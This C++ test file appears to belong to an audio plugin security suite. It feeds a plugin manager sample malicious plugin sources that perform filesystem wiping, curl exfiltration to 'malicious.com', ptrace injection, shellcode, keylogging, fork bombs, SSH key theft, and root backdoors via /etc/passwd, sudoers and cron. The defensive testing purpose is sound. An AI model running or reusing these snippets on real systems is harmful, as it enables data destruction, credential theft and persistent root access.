#include "PluginSecurityTest.h"

using namespace SchillingerEcosystem::Audio::SecurityTests;

//==============================================================================
// Sandboxing Vulnerability Tests
// These tests demonstrate the critical vulnerability where plugins execute
// without proper sandboxing or isolation

TEST_F(SandboxingTest, FilesystemAccess_AllowsSystemFileManipulation)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can access filesystem without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> filesystemAttackPlugins = {
        {testRoot_ / "filesystem_delete.cpp", "system('rm -rf /tmp/testfile');"},
        {testRoot_ / "filesystem_write.cpp", "std::ofstream('/etc/evil_file') << 'hacked';"},
        {testRoot_ / "filesystem_read.cpp", "std::ifstream('/etc/passwd').rdbuf();"},
        {testRoot_ / "filesystem_chmod.cpp", "chmod('/etc/shadow', 0777);"},
        {testRoot_ / "filesystem_create.cpp", "mkdir('/tmp/backdoor', 0755);"}
    };

    for (const auto& [pluginPath, filesystemAttack] : filesystemAttackPlugins) {
        createMaliciousPlugin(pluginPath, filesystemAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with filesystem access was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains filesystem attack code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Filesystem sandboxing bypassed - system files at risk";
        }
    }
}

TEST_F(SandboxingTest, NetworkAccess_AllowsUnauthorizedConnections)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can access network without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> networkAttackPlugins = {
        {testRoot_ / "network_exfil.cpp", R"(
            #include <curl/curl.h>
            void exfiltrate() {
                CURL* curl = curl_easy_init();
                curl_easy_setopt(curl, CURLOPT_URL, "https://malicious.com/exfil");
                curl_easy_perform(curl);
            }
        )"},
        {testRoot_ / "network_bind.cpp", R"(
            #include <sys/socket.h>
            void bind_backdoor() {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                bind(sock, (struct sockaddr*)&addr, sizeof(addr));
                listen(sock, 5);
            }
        )"},
        {testRoot_ / "network_scan.cpp", R"(
            #include <arpa/inet.h>
            void scan_network() {
                for(int i = 1; i < 255; i++) {
                    connect(sock, &target, sizeof(target));
                }
            }
        )"}
    };

    for (const auto& [pluginPath, networkAttack] : networkAttackPlugins) {
        createMaliciousPlugin(pluginPath, networkAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with network access was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains network attack code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Network sandboxing bypassed - unauthorized network access";
        }
    }
}

TEST_F(SandboxingTest, ProcessAccess_AllowsProcessManipulation)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can access other processes without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> processAttackPlugins = {
        {testRoot_ / "process_kill.cpp", "kill(getppid(), SIGKILL);"},
        {testRoot_ / "process_inject.cpp", R"(
            #include <sys/ptrace.h>
            void inject_process() {
                ptrace(PTRACE_ATTACH, target_pid, 0, 0);
                ptrace(PTRACE_POKETEXT, target_pid, (void*)address, malicious_code);
            }
        )"},
        {testRoot_ / "process_spawn.cpp", "execl('/bin/bash', 'bash', '-c', 'malicious_command', NULL);"},
        {testRoot_ / "process_memory.cpp", R"(
            #include <sys/mman.h>
            void read_process_memory() {
                void* ptr = mmap(0, size, PROT_READ, MAP_SHARED, mem_fd, offset);
                read(mem_fd, ptr, size);
            }
        )"}
    };

    for (const auto& [pluginPath, processAttack] : processAttackPlugins) {
        createMaliciousPlugin(pluginPath, processAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with process access was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains process attack code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Process sandboxing bypassed - processes can be manipulated";
        }
    }
}

TEST_F(SandboxingTest, MemoryAccess_AllowsArbitraryMemoryOperations)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can access arbitrary memory without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> memoryAttackPlugins = {
        {testRoot_ / "memory_overflow.cpp", R"(
            void buffer_overflow() {
                char buffer[10];
                strcpy(buffer, "This string is way too long and causes overflow");
            }
        )"},
        {testRoot_ / "memory_arbitrary.cpp", R"(
            void arbitrary_memory() {
                char* ptr = (char*)0x12345678;
                *ptr = 'X';
            }
        )"},
        {testRoot_ / "memory_malloc.cpt", R"(
            void memory_exhaustion() {
                while(1) {
                    malloc(1024*1024); // Exhaust all memory
                }
            }
        )"},
        {testRoot_ / "memory_shellcode.cpp", R"(
            void shellcode_execution() {
                char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68";
                void* ptr = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
                memcpy(ptr, shellcode, sizeof(shellcode));
                ((void(*)())ptr)();
            }
        )"}
    };

    for (const auto& [pluginPath, memoryAttack] : memoryAttackPlugins) {
        createMaliciousPlugin(pluginPath, memoryAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with memory access vulnerabilities was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains memory attack code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Memory sandboxing bypassed - arbitrary memory access possible";
        }
    }
}

TEST_F(SandboxingTest, SystemCalls_AllowsPrivilegedOperations)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can make privileged system calls without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> syscallAttackPlugins = {
        {testRoot_ / "syscall_mount.cpp", "mount('/dev/sda1', '/mnt', 'ext4', 0, NULL);"},
        {testRoot_ / "syscall_chmod.cpp", "chmod('/etc/passwd', 0777);"},
        {testRoot_ / "syscall_chown.cpp", "chown('/etc/shadow', 0, 0);"},
        {testRoot_ / "syscall_setuid.cpp", "setuid(0); setgid(0);"},
        {testRoot_ / "syscall_reboot.cpp", "reboot(LINUX_REBOOT_CMD_RESTART);"}
    };

    for (const auto& [pluginPath, syscallAttack] : syscallAttackPlugins) {
        createMaliciousPlugin(pluginPath, syscallAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with privileged system calls was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains privileged system call code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: System call sandboxing bypassed - privileged operations possible";
        }
    }
}

TEST_F(SandboxingTest, DeviceAccess_AllowsHardwareManipulation)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can access hardware devices without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> deviceAttackPlugins = {
        {testRoot_ / "device_keyboard.cpp", R"(
            void keylogger() {
                int kb_fd = open("/dev/input/event0", O_RDONLY);
                read(kb_fd, &event, sizeof(event));
            }
        )"},
        {testRoot_ / "device_network.cpp", R"(
            void packet_sniffer() {
                int sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
                recv(sock_fd, buffer, sizeof(buffer), 0);
            }
        )"},
        {testRoot_ / "device_disk.cpp", R"(
            void disk_access() {
                int disk_fd = open("/dev/sda", O_RDWR);
                write(disk_fd, malicious_data, sizeof(malicious_data));
            }
        )"},
        {testRoot_ / "device_memory.cpp", R"(
            void raw_memory() {
                int mem_fd = open("/dev/mem", O_RDWR);
                void* ptr = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mem_fd, 0x100000);
            }
        )"}
    };

    for (const auto& [pluginPath, deviceAttack] : deviceAttackPlugins) {
        createMaliciousPlugin(pluginPath, deviceAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with device access was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains device access code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Device sandboxing bypassed - hardware manipulation possible";
        }
    }
}

TEST_F(SandboxingTest, ResourceExhaustion_AllowsDenialOfService)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can exhaust system resources without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> dosAttackPlugins = {
        {testRoot_ / "dos_fork.cpp", R"(
            void fork_bomb() {
                while(1) {
                    fork();
                }
            }
        )"},
        {testRoot_ / "dos_memory.cpp", R"(
            void memory_bomb() {
                while(1) {
                    malloc(1024*1024*1024); // Allocate 1GB repeatedly
                }
            }
        )"},
        {testRoot_ / "dos_cpu.cpp", R"(
            void cpu_bomb() {
                while(1) {
                    // Infinite loop to consume CPU
                }
            }
        )"},
        {testRoot_ / "dos_disk.cpp", R"(
            void disk_bomb() {
                while(1) {
                    std::ofstream file("/tmp/junk_" + std::to_string(rand()));
                    file << std::string(1024*1024, 'J'); // Write 1MB of junk
                }
            }
        )"}
    };

    for (const auto& [pluginPath, dosAttack] : dosAttackPlugins) {
        createMaliciousPlugin(pluginPath, dosAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with DoS capability was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains DoS attack code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Resource sandboxing bypassed - denial of service possible";
        }
    }
}

TEST_F(SandboxingTest, InformationDisclosure_AllowsSensitiveDataAccess)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can access sensitive information without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> disclosureAttackPlugins = {
        {testRoot_ / "disclosure_environment.cpp", R"(
            void steal_environment() {
                extern char** environ;
                for(int i = 0; environ[i]; i++) {
                    // Send environment variables to attacker
                }
            }
        )"},
        {testRoot_ / "disclosure_passwords.cpp", R"(
            void steal_passwords() {
                std::ifstream shadow("/etc/shadow");
                std::string line;
                while(std::getline(shadow, line)) {
                    // Send password hashes to attacker
                }
            }
        )"},
        {testRoot_ / "disclosure_ssh.cpp", R"(
            void steal_ssh_keys() {
                std::ifstream ssh_key("/home/user/.ssh/id_rsa");
                std::string key((std::istreambuf_iterator<char>(ssh_key)),
                               std::istreambuf_iterator<char>());
                // Send private key to attacker
            }
        )"},
        {testRoot_ / "disclosure_processes.cpp", R"(
            void steal_process_info() {
                DIR* proc_dir = opendir("/proc");
                struct dirent* entry;
                while((entry = readdir(proc_dir)) != NULL) {
                    // Read process information from /proc/[pid]/
                }
            }
        )"}
    };

    for (const auto& [pluginPath, disclosureAttack] : disclosureAttackPlugins) {
        createMaliciousPlugin(pluginPath, disclosureAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with information disclosure capability was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains information disclosure code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Information sandboxing bypassed - sensitive data disclosure possible";
        }
    }
}

TEST_F(SandboxingTest, PrivilegeEscalation_AllowsRootAccess)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that plugins can escalate privileges without sandboxing
    std::vector<std::pair<std::filesystem::path, std::string>> privilegeAttackPlugins = {
        {testRoot_ / "privilege_setuid.cpp", R"(
            void escalate_to_root() {
                if (setuid(0) == 0) {
                    system("chmod 777 /etc/passwd");
                    system("echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd");
                }
            }
        )"},
        {testRoot_ / "privilege_sudo.cpp", R"(
            void sudo_exploit() {
                system("echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers");
            }
        )"},
        {testRoot_ / "privilege_cron.cpp", R"(
            void cron_persistence() {
                std::ofstream cron_job("/etc/cron.d/malicious");
                cron_job << "* * * * * root /bin/bash -c 'rm -rf /' > /dev/null 2>&1\n";
            }
        )"},
        {testRoot_ / "privilege_service.cpp", R"(
            void service_persistence() {
                system("cp malicious_binary /usr/local/bin/legitimate_service");
                system("systemctl enable legitimate_service");
            }
        )"}
    };

    for (const auto& [pluginPath, privilegeAttack] : privilegeAttackPlugins) {
        createMaliciousPlugin(pluginPath, privilegeAttack);

        bool loadResult = manager_->loadPluginFromPath(pluginPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL: Plugin with privilege escalation capability was accepted: " << pluginPath.string();

        if (loadResult) {
            EXPECT_TRUE(fileContainsMaliciousCode(pluginPath)) << "Plugin contains privilege escalation code but was loaded";
            ADD_FAILURE() << "SECURITY BREACH: Privilege sandboxing bypassed - root access possible";
        }
    }
}